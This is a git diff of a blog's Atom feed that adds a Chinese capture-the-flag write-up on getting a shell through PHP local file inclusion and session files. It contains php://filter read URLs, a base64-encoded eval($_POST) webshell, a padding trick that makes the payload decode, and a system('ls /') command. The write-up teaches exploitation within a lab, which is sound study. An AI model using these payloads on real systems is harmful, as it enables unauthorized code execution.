@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://outlaws-bai.github.io</id>
     <title>outlaws&apos; blog</title>
-    <updated>2021-03-19T03:31:53.357Z</updated>
+    <updated>2021-03-22T06:41:33.586Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://outlaws-bai.github.io"/>
     <link rel="self" href="https://outlaws-bai.github.io/atom.xml"/>
@@ -10,6 +10,71 @@
     <logo>https://outlaws-bai.github.io/images/avatar.png</logo>
     <icon>https://outlaws-bai.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, outlaws&apos; blog</rights>
+    <entry>
+        <title type="html"><![CDATA[记一道session文件包含题目]]></title>
+        <id>https://outlaws-bai.github.io/post/LFI_session/</id>
+        <link href="https://outlaws-bai.github.io/post/LFI_session/">
+        </link>
+        <updated>2021-03-22T06:10:44.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="考点">考点</h1>
+<p>1.LFI(文件包含)</p>
+<p>2.session文件包含getshell</p>
+<p>3.base64</p>
+<h1 id="确认利用方式">确认利用方式</h1>
+<figure data-type="image" tabindex="1"><img src="https://outlaws-bai.github.io/post-images/1616393865233.png" alt="" loading="lazy"></figure>
+<p>进入主页，找漏洞，点击test处，存在明显LFI文件包含漏洞</p>
+<figure data-type="image" tabindex="2"><img src="https://outlaws-bai.github.io/post-images/1616393954087.png" alt="" loading="lazy"></figure>
+<p>php伪协议base64读index.php，解码后得到</p>
+<p>http://42.192.77.229:20012/?file=php://filter/convert.base64-encode/resource=index.php</p>
+<figure data-type="image" tabindex="3"><img src="https://outlaws-bai.github.io/post-images/1616393969415.png" alt="" loading="lazy"></figure>
+<p>同样继续读page.php，无敏感信息。</p>
+<p>回头想到还有test.php，同样伪协议读取后解码得到</p>
+<figure data-type="image" tabindex="4"><img src="https://outlaws-bai.github.io/post-images/1616393982743.png" alt="" loading="lazy"></figure>
+<p>确认此题应是使用php-LFI session文件包含getshell</p>
+<h1 id="找到session存储路径">找到session存储路径</h1>
+<p>测试常见session保存路径</p>
+<p>常见有</p>
+<pre><code>/var/lib/php/sess_PHPSESSID
+/var/lib/php/sessions/sess_PHPSESSID
+/var/lib/php5/sessions/sess_xxx
+/tmp/sess_PHPSESSID
+/tmp/sessions/sess_PHPSESSID
+/var/lib/sess_PHPSESSID
+</code></pre>
+<p>其中的PHPSESSID为Cookie处</p>
+<figure data-type="image" tabindex="5"><img src="https://outlaws-bai.github.io/post-images/1616393997142.png" alt="" loading="lazy"></figure>
+<p>测试后得到session路径为</p>
+<p>/var/lib/php/sessions/sess_PHPSESSID</p>
+<p>此处即为:</p>
+<p>/var/lib/php/sessions/sess_2b9ueurjdie3245hpr7kb4s615</p>
+<p>读取后得到内容</p>
+<p>user_id|s:32:&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&quot;;views|i:5;</p>
+<p>得知此处传入的user_id是使用base64存储在session中的。猜测可否使用php伪协议解码后利用，但发现解码后为乱码且无法利用。</p>
+<h1 id="bypass">bypass</h1>
+<p>再找思路，回顾base64，是将每3位字符编码为4位字符。最后得到的编码长度必须为4的倍数，不足处添加等号=</p>
+<p>照着这个思路，只需保证base64(payload)前的可解码长度为4的倍数，则可以对一句话正常解码再利用。</p>
+<p>备注：base64对不存在码表中的字符会略过。</p>
+<p>所以base64(payload)前的user_id|s:32:&quot;，base64实际解码的是userids32，长度仅为9。</p>
+<p>备注：此处的32为len(base64(payload))</p>
+<p>所以要利用的话s处的长度必得为5位数，才能使得base64(payload)前的可解码长度为4的倍数，进而保证base64(payload)可以被解码为payload(一句话)。此处利用python得到'a'*30000</p>
+<figure data-type="image" tabindex="6"><img src="https://outlaws-bai.github.io/post-images/1616394012416.png" alt="" loading="lazy"></figure>
+<p>提交后，读取session</p>
+<figure data-type="image" tabindex="7"><img src="https://outlaws-bai.github.io/post-images/1616394025696.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://outlaws-bai.github.io/post-images/1616394041882.png" alt="" loading="lazy"></figure>
+<p>/var/lib/php/sessions/sess_2b9ueurjdie3245hpr7kb4s615</p>
+<figure data-type="image" tabindex="9"><img src="https://outlaws-bai.github.io/post-images/1616394055068.png" alt="" loading="lazy"></figure>
+<h1 id="getflag">getflag</h1>
+<p>利用伪协议解码：</p>
+<p>http://42.192.77.229:20012/?file=php://filter/convert.base64-decode/resource=/var/lib/php/sessions/sess_2b9ueurjdie3245hpr7kb4s615</p>
+<p>POST：1=phpinfo();</p>
+<p>成功利用</p>
+<figure data-type="image" tabindex="10"><img src="https://outlaws-bai.github.io/post-images/1616394066494.png" alt="" loading="lazy"></figure>
+<p>1=system('ls /');</p>
+<figure data-type="image" tabindex="11"><img src="https://outlaws-bai.github.io/post-images/1616394080300.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://outlaws-bai.github.io/post-images/1616394091568.png" alt="" loading="lazy"></figure>
+<p>flag{bf00afbd066e5bb54709b4ae6277d79f}</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[XXE]]></title>
         <id>https://outlaws-bai.github.io/post/xxe/</id>
